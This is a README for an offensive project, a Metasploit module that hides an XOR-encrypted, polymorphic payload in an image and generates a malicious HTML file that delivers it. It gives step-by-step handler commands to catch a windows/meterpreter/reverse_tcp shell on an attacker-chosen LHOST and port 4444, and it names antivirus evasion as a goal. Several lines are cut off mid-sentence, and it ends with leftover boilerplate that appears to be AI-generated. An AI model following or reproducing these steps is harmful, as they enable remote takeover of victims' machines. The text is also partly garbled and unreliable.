# Embedded Image Payload Module

This project demonstrates how to create a Metasploit module that embeds a payload into an image file and generates a malicious HTML file to execute the payload on a target machine.
## Features

- Embeds a payload into an image file using steganography techniques
- Encrypts the payload using XOR encryption with a random key
- Applies polymorphic techniques to obfuscate the payload and evade antivirus detection
- Generates a malicious HTML file that extracts and e- Sets up a Metasploit handler to receive the reverse shell connection

## Requirements

- Ruby programming language
- Metasploit framework

## Usage

1. Clone the repository:
git clone https://github.com/your-username/embedded-image-payload.git


Copy code

2. Install the required dependencies:
bundle install


Copy code

3. Customize the module and payload:
- Open the `module.rb` file and modify the module options, such as the image path and output path.
- Open the `payload.rb` file and customize the payload generation and obfuscation techniques as needed.

4. Generate the payload and embed it into the image:
ruby exploit.rb


Copy code

5. Set up the Metasploit handler:
- Open a new terminal window and start the Metasploit console:
  ```
  msfconsole
  ```
- Select the `exploit/multi/handler` module:
  ```
  use exploit/multi/handler
  ```
- Set the payload to match the one used in the malicious HTML file:
  ```
  set PAYLOAD windows/meterpreter/reverse_tcp
  ```
- Set the `LHOST` and `LPORT` options to specify the IP address and port for the  ```
  set LHOST YOUR_IP
  set LPORT 4444
  ```
- Start the handler:
  ```
  run
  ```

6. Transfer the generated malicious HTML file to the ta
7. Once the payload is executed, a reverse shell connection will be established, and you can interact with the target machine using Meterpreter commands.

## Disclaimer

This project is intended for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this project. Use it at your own risk and ensure that you have proper authorization before using it in any real-world scenarios.

## License

This project is licensed under the [MIT License](LICENSE).
## Acknowledgements

- Metasploit framework
- Ruby programming language
Feel free to customize the README.md file based on your specific project details and requirements. You can add more sections, such as installation instructions, contributing guidelines, or any other relevant information.

Remember to replace **YOUR_IP** with the actual IP address of your machine where you want to receive the reverse shell connection.

